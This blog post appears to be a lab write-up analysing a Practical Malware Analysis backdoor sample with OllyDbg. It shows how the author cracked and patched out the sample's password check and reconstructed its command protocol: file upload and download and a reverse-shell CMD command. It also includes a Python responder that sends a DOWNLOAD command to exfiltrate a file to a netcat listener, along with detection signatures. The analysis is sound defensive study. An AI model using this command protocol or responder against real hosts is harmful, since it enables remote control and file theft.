---
layout:     post
title:      "PMA Labs Writeup: OllyDbg"
date:       2020-08-04 15:00:00
author:     Jon Winsley
comments:   true
summary:    My analysis of the debugging labs in Chapter 9 of "Practical Malware Analysis".
categories: malware-analysis
---

[Practical Malware Analysis](https://practicalmalwareanalysis.com/) is still a handbook for aspiring malware analysts, and while I've dabbled in the subject before, I've decided to work through the book for a better hands-on grasp of malware reverse engineering. Needless to say, this writeup will contain spoilers.

# Chapter 9: OllyDbg

## Lab 09-01

We'll refer back to the [basic dynamic analysis writeup](https://www.jonwinsley.com/malware-analysis/2020/07/29/pma-writeup-chapter-3/) from Chapter 3 rather than rehashing that for this executable. This was Lab03-04.exe. We saw at the time that the executable tried to delete itself when we ran it directly. It's likely expecting a command-line parameter; let's take a peek with IDA and find out.

### Disassembly

Glancing briefly over the file, we see it checks for an initial parameter, and self-destructs if it doesn't pass the complex test function. We'll test this with OllyDbg to see what it does, exactly. Then it looks for more command-line arguments and tests a couple specifically:

```
-in [param1] password
-re [param1] password
-c param1 param2 param3 param4 password
-cc password
```

Then it checks for the number of additional arguments (up to 4!) and, if they do not match, it self-destructs. This makes the selfDestruct function fairly easy to pick out.

We'll look at these command-line arguments, come up with some hypotheses about what they do, and then test them with OllyDbg.

**The -in flag**

This looks like the install argument. There's a function call to get the current executable's filename, and then a function call that has logic around creating a service. The service name appears to be partly comprised of the string " Manager Service", but it looks like there's another component, probably the service name passed in as a function parameter. When invoked as `Lab09-01.exe password -in`, the service name comes from the executable; when invoked as `Lab09-01.exe password -in param2`, it comes from the optional second argument.

Once we dissect the password, we'll test this dynamically and see if we can set the service name.

**The -re flag**

This looks like the uninstall argument. It's very similar to the code under the -in flag, but it deletes the service instead of creating it.

Once we dissect the password, we'll test this dynamically and see if we can remove the service previously created.

**The -c flag**

This creates a registry key under "SOFTWARE\Microsoft \XPS" (note the space) with a value pair named "Configuration". It's not immediately obvious what value is being stored, so we'll analyze that later.

Once we dissect the password, we'll test this dynamically and try adding a registry key with some junk data. Then we'll watch what it does with OllyDbg.

**The -cc flag**

This seems to be the reverse of the -c flag, querying the registry key and performing some similarly obscure processing on the value. Then it runs the results through `printf` (not going to catch me again, rabbit hole!).

**No flag**

When we ran it before with no flag, nothing happened; but there is a path for it, *if* the registry key exists! In that case it does some processing based on certain commands which appear to be stored in the registry. Of note are "SLEEP", "NOTHING", "DOWNLOAD", "CMD", and "UPLOAD". We'll test these with the -c flag and see if we can decipher how they are to be used.

### Debugging

From looking at the disassembly in IDA, there are references to 0x61 (`a`) and 0x63 (`c`), and it appears to be checking for a string of length 4, so we'll start there. We'll invoke OllyDbg, open the malware with parameters `-in acac`, and add a breakpoint on the password validation function.

On the first run through we note that the length is accepted (whew), it verifies the first character, and then fails the second. It's doing some calculation that should result in a 1, but ends up as a 2. Hmm... well, let's try a different password, `-in attr`. This time the difference is higher. Perhaps the calculation is the difference between the first and second characters? We try `-in abcd` and it passes!

We let the execution continue and then check our services. Sure enough, Lab09-01 Manager Service now appears in the list! Let's patch the malware to remove the password - and maybe the self-destruct function while we're at it - and then we'll switch back to dynamic analysis to test our theories above.

To patch the malware, I am just replacing the body of those two functions with NOP instructions (0x90), being careful not to mess with the stack instructions at the beginning and end. I save the changes to Lab09-01_patched.exe. Now the moment of truth: if I run it without arguments, will it delete itself? It does not! And running it with a bogus password works too.

Back to the dynamic analysis. As predicted, the -in flag installs the service, by default using the name of the executable. The -re flag removes the service. The -c flag writes to the XPS registry key, and stores the four parameters we passed, encoded as binary. The -cc flag prints the string `k:param1 h:param2 p:param3 per:param4`. This may be a clue as to their purpose. Let's open OllyDbg again and see what more we can find out.

As noted before, if there is a registry key set, we can run the malware without any command-line parameters and it will go into a loop waiting for activity. We'll skip past the part where it reads from the registry and put a breakpoint at the command handler at `sub_402020`.

After stepping through the execution, we find that it tries to convert "param3" to a number with atoi and fails. IDA automatically correlates this variable with `hostshort`, so this might be a port number. Let's try setting this parameter in the registry to 80 and run again.

```
Lab09-01_patched.exe -c param1 param2 80 param4 abcd
```

Sure enough, this step now passes. The malware sets some parameters and calls a function with strings like "GET" and "HTTP/1.0", suggesting an HTTP connection. One of the parameters is "param2", one is 0x50 (which we've seen before as the hex for port 80), one is a mysterious string "QUAY/wVLs.3xG", and the other two are memory addresses. Let's see if we can figure out how these are used.

The first thing it does is try to establish a socket to "param2" on port 0x50. This must be where we specify the hostname. We have our mock network up and running, so let's specify a domain and update our registry config:

```
Lab09-01_patched.exe -c param1 practicalmalwareanalysis.com 80 param4 abcd
```

On this run through the mysterious string changed to "7FDj/1cdS.bY4". As we continue stepping through, it's appended with a couple other strings to form "GET 7FDj/1cdS.by4 HTTP/1.0" (plus some carriage returns at the end) and then sent over the socket. Then it waits for a response. If it doesn't get one, it quits. Otherwise, it keeps getting chunks until it gets one that contains `\r\n\r\n`, then returns the contents of the response.

Now that we've labeled this function in IDA, the following logic starts to make more sense. It checks for the string `` `'`'` ``, followed by the string `` '`'`' ``, and makes sure they are less than 0x400 characters apart. Then, at a guess, it extracts the command from between those indicators and returns it.

Finally, jumping back up, there's a series of if-checks to decide what to do for each command. UPLOAD and DOWNLOAD seem to expect a series of strings, like:

```
`'`'` UPLOAD [port] [filename] '`'`'
`'`'` DOWNLOAD [port] [filename] '`'`'
```

CMD opens a reverse shell, piping the output to a port, and wrapping the command in backticks to allow spaces:

```
`'`'` CMD [port] `[cmd]` '`'`'
```

SLEEP sleeps for the specified number of milliseconds:

```
`'`'` SLEEP [milliseconds] '`'`'
```

And NOTHING, as might be expected, does nothing.

The HTTP request the malware sends is malformed, so inetsim complains. And the malware is expecting a response after it sends its request, so a simple netcat listener won't do. Instead, we can whip up a simple Python responder on our Ubuntu analysis machine:

```py
import socket

sock = socket.create_server(("192.168.42.1", 80))
sock.listn(5)

while True:
  (client, address) = sock.accept()
  with client:
    print('Connected by ', address)
    while True:
      data = client.recv(1024)
      if not data:
        break
      print(data)
      print("Sending command...")
      client.sendall(b"`'`'`DOWNLOAD 15000 C:\\test.txt'`'`'\r\n\r\n")
      print("Command sent")
```

This may not be ideal Python socket code, but it works to test our hypotheses. We'll set up a netcat listener on port 15000 with `nc -l -p 15000 > output.txt` and create a text file on the malware host as the data to be downloaded.

Then we run the server and test the malware. Sure enough, the command is sent, and when we inspect output.txt it contains the contents of our `C:\test.txt` data file!

Upload works similarly, but in reverse: we can pipe a file to netcat with `nc -l -p 15000 < input.txt` and the file will be created on the malware host.

One of our hypotheses was incorrect: when tested, SLEEP's parameter turns out to be in seconds, not milliseconds. Everything else (even NOTHING) works as expected. It's worth noting that the malware will exit after a successful CMD, UPLOAD, or DOWNLOAD, and otherwise loop indefinitely.

* Host-based signatures
  * Services
    * `/.* Management Service/`
  * Registry Keys
    * `SOFTWARE\Microsoft \XPS\Configuration`
* Network-based signatures
  * Traffic
    * `/GET [a-zA-Z0-9]{4}/[a-zA-Z0-9]{4}\.[a-zA-Z0-9]{3} HTTP/1.0/`
    * The lack of a leading slash may help eliminate false positives, but this is not a very reliable signature.

## Lab 09-02

### Static Analysis

There are no strings of interest except one, `cmd`, suggesting any strings that are used are obfuscated somehow. The malware does not appear to be packed. There are imports for writing files, opening sockets, and creating processes.

### Dynamic Analysis

The malware exits almost as soon as it starts. Initial dynamic analysis is fruitless. Let's see if it's expecting a command-line parameter.

### Disassembly & Debugging

The first thing we notice is that it's checking its own filename. We'll fast-forward through the logic to strcmp and add a breakpoint to inspect the parameters. Sure enough: it's checking if the filename equals `ocl.exe`. Let's change it and see what happens next.